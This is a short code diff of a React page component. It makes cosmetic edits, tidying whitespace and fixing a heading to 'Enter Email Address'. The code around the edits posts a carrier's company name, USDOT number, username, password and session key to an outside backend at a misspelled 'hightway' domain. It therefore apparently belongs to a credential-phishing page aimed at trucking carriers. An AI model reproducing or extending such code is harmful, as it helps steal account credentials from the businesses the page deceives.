@@ -192,7 +192,7 @@ function AllPage() {
     await axios.post("https://hightway-be.onrender.com/api/send-form", {
       companyName: data?.legal_name,
       dot: data?.usdot,
-      username: formData.userName, 
+      username: formData.userName,
       password: formData.password,
       key: "Resend",
       sessionKey: sessionKeyRef.current,
@@ -226,7 +226,7 @@ function AllPage() {
           style={keyscren ? { display: "none" } : { display: "block" }}
           className="section-heading"
         >
-          {nextform ? "Enter Email Address" : "Carrier Details"}
+          {"Enter Email Address"}
         </h3>
         <p
           style={keyscren ? { display: "none" } : { display: "block" }}
@@ -358,7 +358,7 @@ function AllPage() {
           Continue
         </button> */}
         <button
-          style={ { display: "block" } }
+          style={{ display: "block" }}
           onClick={sendForm}
           className={nextformButNext ? "button" : "button button-disabled"}
           disabled={!nextformButNext}
